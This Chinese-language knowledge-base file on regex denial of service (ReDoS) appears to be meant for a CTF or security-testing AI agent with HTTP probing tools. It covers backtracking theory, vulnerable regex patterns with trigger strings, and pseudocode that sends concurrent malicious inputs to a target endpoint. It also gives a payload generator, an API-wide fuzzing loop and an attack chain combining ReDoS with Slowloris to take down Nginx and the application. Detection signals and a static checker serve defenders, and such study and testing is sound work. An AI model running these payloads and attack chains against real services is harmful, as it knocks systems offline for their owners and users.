# ReDoS — 正则表达式拒绝服务

## 场景

攻击者构造特定输入字符串，触发正则引擎进入指数级回溯，单次请求即可消耗数秒甚至数分钟 CPU。不同于带宽攻击，ReDoS 是 **算法复杂度攻击**：输入仅几十字节，却能打满整个 Worker 进程。

```
输入: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"  (30 bytes)
正则有漏洞时: CPU 100% 持续 >60 秒
等效: 1 个恶意请求 ≈ 10000+ 正常请求的 CPU 消耗
```

## 输入信号

- 单请求响应时间异常增长 (正常 50ms → 攻击时 30s+)，但请求体仅几十字节
- CPU `softirq` 或 `si` (software interrupt) 占比异常升高，系统态 CPU 远高于用户态
- 同一正则模式的匹配失败耗时逐步递增 (每次回溯路径不同)
- Apache/Nginx `MaxRequestWorkers` / `worker_connections` 满，Worker 进程 CPU 100%
- Node.js Event Loop 延迟飙升 (`eventloop_lag` 指标 > 1s)
- Sentry/NewRelic 堆栈中 `preg_match` / `re.match` / `Pattern.compile` 等调用占据大量时间
- 应用日志中出现 `Maximum execution time exceeded` 或 `Regular expression backtrack limit`
- 请求体中出现大量重复字符 + 单个不匹配字符模式 (`aaaa...!`)

---

## 核心原理: 回溯爆炸

正则引擎 (NFA) 对量词嵌套的处理:

```
模式: /^(a+)+$/
输入: "aaaaX"

引擎行为:
  a+ 匹配 4 个 a → 外层 + 尝试再匹配 → 内层拿 3 个 a → 外层再拿 1 个 a → ...
  每次遇到 X 失败，回溯到上一个分支，尝试不同的 a 分配方式
  
  对 n 个 a: 回溯次数 ≈ O(2^n)
  n=25 → 33,554,432 次回溯
  n=30 → 1,073,741,824 次回溯 → 秒级挂起
  n=35 → 34,359,738,368 次 → 分钟级挂起
```

### 三种危险模式

```
1. 嵌套量词:   (a+)+    (a*)*    (.+)+
2. 重叠交替:   a|aa     a+|a     .*|.*
3. 可选段重叠: a?a?     (a|aa)+b
```

## 常见脆弱正则库

```python
# 这些正则在许多 Web 应用中存在，可直接利用

# Email 验证 (OWASP 推荐版本本身有 ReDoS)
r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
# 触发: "aaaaa...@" + "." * 1000 + "!"

# 路径清理
r'\.\.\/|\.\/|~\/'              # 安全
r'(\.\.\/)+'                    # 安全
r'^(.*\/)?([^\/]+)$'            # 不一定
r'(.*\/)*.*'                    # 危险! 对超长无 / 字符串回溯

# HTML tag 匹配
r'<[^>]*>([^<]*<[^>]*>)*'      # 危险! 嵌套量词

# JSON string 匹配 (某流行库早期版本)
r'"([^"\\]|\\.)*"'              # 安全
r'"(([^"\\]|\\.)*)*"'           # 危险! 双层 *

# 密码复杂度
r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$'  # 安全 (lookahead 不回溯)
r'[a-zA-Z\d]*[a-z]+[A-Z]+\d+[a-zA-Z\d]*'   # 危险! 重叠字符类

# 数字提取
r'^\d+[\d,.]*\d+$'             # 危险! 首尾都贪婪
```

## 利用模式

### 模式 1: 单请求 CPU 打满

```
攻击者 → POST /api/validate → 超长恶意字符串 → 正则回溯爆炸 → Worker 100% CPU 30s
同时发送 10 个 → 10 Worker 全部挂 → 服务无响应
```

伪代码:
```
function reDoS_Single(target, regex_endpoint, evil_string):
    # 并发发送恶意输入
    for 1 .. concurrency:
        spawn:
            http.post(target + regex_endpoint, 
                      body={"input": evil_string},
                      timeout=90)
    
    # 同时发正常请求验证 DoS 效果
    spawn:
        t0 = now()
        http.get(target + "/health", timeout=5)
        t1 = now()
        if (t1 - t0) > 3s:
            # ReDoS 确认: 正常请求已被阻塞
            return True
```

### 模式 2: 渐进式破坏 (Gradual Degradation)

```
不直接打满 CPU，而是让每个请求变慢 2-5 秒
累积效应: 请求队列越来越长 → 超时链 → cascading failure

优势: 
  - 不触发异常 CPU 告警
  - 难以与慢业务逻辑区分
  - CDN/WAF 难以识别
```

### 模式 3: 通过输入扩散 ReDoS

```
源头: 用户输入 → 正则验证 → 写入数据库
下游: 定时任务用正则解析数据 → ReDoS 在后台触发
效果: 绕过前端 WAF，在内部服务触发
```

## 攻击构造

### 生成恶意输入

```python
# 给定一个脆弱的正则，生成触发最大回溯的输入

def generate_reDoS_payload(pattern, max_len=128):
    """
    分析正则的量词结构，生成触发指数回溯的输入
    
    策略:
      对 (a+)+:     生成 N 个 a + 不匹配的结尾字符
      对 (a|aa)+b:  生成 N 个 a (触发交替回溯) + 无 b 结尾
      对 (a?){N}a{N}: 生成 N-1 个 a (触发可选路径回溯)
    """
    
    # 检测嵌套量词
    if has_nested_quantifier(pattern):
        # 提取内层字符类
        inner_char = extract_inner_char(pattern)
        # 生成大量该字符，结尾放一个不匹配的字符
        payload = inner_char * (max_len - 1) + "!"
    
    # 检测重叠交替
    elif has_overlapping_alternation(pattern):
        char = extract_overlap_char(pattern)
        payload = char * (max_len - 1)
    
    return payload
```

### 模糊测试发现漏洞

```
# 对目标 API 的所有参数注入 ReDoS payload
# 测量响应时间判断

for each endpoint in api_endpoints:
    for each param in endpoint.params:
        # 发送正常输入，记录基准时间
        baseline = measure_response_time(endpoint, {param: "normal"})
        
        # 发送恶意输入
        evil = generate_reDoS_payload(guess_pattern(param))
        attack_time = measure_response_time(endpoint, {param: evil})
        
        # 时间放大 >10x → 可能存在 ReDoS
        if attack_time > baseline * 10:
            log("[VULN] {endpoint}.{param}: {baseline}ms → {attack_time}ms")
            
            # 二分法确定触发阈值
            lo, hi = 1, len(evil)
            while lo < hi:
                mid = (lo + hi) // 2
                t = measure_response_time(endpoint, 
                      {param: evil[:mid] + "!"})
                if t > baseline * 3:
                    hi = mid
                else:
                    lo = mid + 1
            log("  触发阈值: {lo} 字符")
```

### 正则模式自动分析

```
# 静态分析正则表达式，判断是否存在指数回溯风险

function is_vulnerable(regex):
    # 转换为 AST
    ast = parse_regex(regex)
    
    # 检查每个路径
    return check_node(ast)

function check_node(node):
    if node is Star or node is Plus:
        # 检查内部是否包含另一量词
        inner = first_child_with_quantifier(node.body)
        if inner:
            return True  # 嵌套量词 → 危险
        
        # 检查内部是否有交替
        if has_overlapping_alternatives(node.body):
            return True  # (a|aa)* → 危险
    
    # 递归检查子节点
    for child in node.children:
        if check_node(child):
            return True
    
    return False
```

## 各语言/引擎特性

```
语言      引擎类型    回溯特性                  可利用性
───────  ──────────  ────────────────────────  ──────────
JS/V8    NFA         有限自动机优化             部分可触发
                        但某些模式仍可回溯
Python   re (NFA)    纯回溯, 无保护            高
         regex       支持设置超时              中等
Java     NFA         有保护机制                中等
         9+ 引入     自动检测
PHP      PCRE        回溯限制默认 1M steps     中等
         pcre.backtrack_limit 可调
Ruby     Onigmo      纯回溯                    高
Go       RE2         无回溯, DFA              低 (但仍有
                        + 有限自动机              边缘情况)
Rust     regex       DFA 引擎                 极低
.NET     NFA         回溯, 有超时 API          中等
```

## 真实案例

| CVE | 目标 | 模式 | 影响 |
|-----|------|------|------|
| CVE-2020-5243 | uap-core (user-agent parser) | `(;\s*[^\s;]+)+` | 50 bytes UA → 100% CPU |
| CVE-2018-10055 | Google Code Prettify | `([^"'\s/]+)+\/?` | JS 高亮库 ReDoS |
| CVE-2020-7754 | NPM `nth-check` | 嵌套 `~` 选择器解析 | CSS selector → ReDoS |
| CVE-2021-27290 | SSRI (npm) | URL scheme 解析 | 大量 npm 包受影响 |
| CVE-2020-28502 | xml-crypto | XML canonicalization | SAML 签名验证 ReDoS |
| CVE-2024-27316 | HTTP/2 CONTINUATION | 非 ReDoS，但同类复杂度 | CPU 100% DoS |

## 攻击链

```
发现阶段:
  1. 收集目标 API 所有接受字符串输入的端点
  2. 识别每个输入可能使用的正则 (email/phone/path/slug/url)
  3. 对每个输入发模糊测试，测量响应时间

利用阶段:
  4. 定位到有 ReDoS 的端点
  5. 计算触发阈值 (最少字符数触发)
  6. 构造最小 payload
  7. 以 2-5x 并发发送 → Worker 全部挂起

混合攻击:
  8. 配合 Slowloris 消耗连接池
  9. ReDoS 消耗 CPU
  10. 两者叠加 → Nginx + App 双双不可用
```

## 参考资料

1. CVE-2020-5243 — uap-core ReDoS (user-agent parser 50 bytes → CPU 100%)
2. CVE-2018-10055 — Google Code Prettify ReDoS
3. CVE-2020-7754 — npm `nth-check` CSS selector ReDoS
4. CVE-2021-27290 — npm `ssri` URL scheme ReDoS (影响数万 downstream)
5. CVE-2020-28502 — xml-crypto SAML ReDoS
6. "Regular Expression Matching Can Be Simple And Fast" — Russ Cox, 2007
7. "Static Analysis for Regular Expression Exponential Runtime via Substructural Logics" — 2016
8. OWASP: Regular expression Denial of Service - ReDoS
9. rxxr: ReDoS static analysis tool (JavaScript)
10. "ReDoS 检测与防御" — OWASP Cheat Sheet Series

## MCP 工具映射

| 步骤 | 工具 | 说明 |
|------|------|------|
| 模糊测试 | `http_probe` | 发送 ReDoS payload，测量响应时间差异 |
| 正则分析 | `kb_router` | 搜索 redos / regex_dos / regular_expression |
| 技术查阅 | `kb_read_file` | 读取本文件完整攻击方法 |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
